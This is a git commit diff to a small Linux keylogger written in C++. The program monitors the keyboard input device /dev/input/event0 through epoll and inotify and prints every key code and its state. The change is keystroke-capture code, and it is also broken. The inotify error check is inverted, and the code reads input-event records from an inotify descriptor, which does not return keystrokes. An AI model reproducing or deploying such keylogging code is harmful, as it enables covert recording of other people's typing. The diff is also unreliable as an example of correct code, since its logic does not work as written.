56900493ec7b6661db33a5f0531883dda693062f
Ben <benedict.sh.lo@gmail.com>
2018-05-30 20:18:28 -0700

    updated

--- src/keylogger.cpp
+++ src/keylogger.cpp
@@ -5,7 +5,10 @@
 #include <stdio.h>
 #include <unistd.h>
 #include <string.h>
+#include <iostream>
+#include <sys/inotify.h>
 #include "epoll.h"
+
 int main(int argc, char **argv){
     int fd, epollfd;
     struct epoll_event event;
@@ -13,14 +16,13 @@ int main(int argc, char **argv){
 
 
     epollfd = createEpollFd();
-    if(fd = open("/dev/input/event0",O_RDONLY) == -1){
-        perror("open");
-    }
-    if(fcntl(fd, F_SETFL, O_NONBLOCK) == -1){
-        perror("nonblocking");
+
+    fd = inotify_init1(IN_NONBLOCK | IN_CLOEXEC);
+    if((inotify_add_watch(fd, "/dev/input/event0", IN_MODIFY)) != -1){
+        perror("inotify_add_watch");
     }
 
-    event.events = EPOLLIN | EPOLLERR | EPOLLHUP | EPOLLET;
+    event.events = EPOLLIN | EPOLLET;
     event.data.fd = fd;
     addEpollSocket(epollfd, fd, &event);
 
@@ -32,6 +34,7 @@ int main(int argc, char **argv){
 
         fds = waitForEpollEvent(epollfd, events);
         for(int i = 0; i < fds; i++){
+            printf("New Keystroke");
             read(fd, &ev, sizeof(struct input_event));
             printf("Key %i state %i \n", ev.code, ev.value);
         }
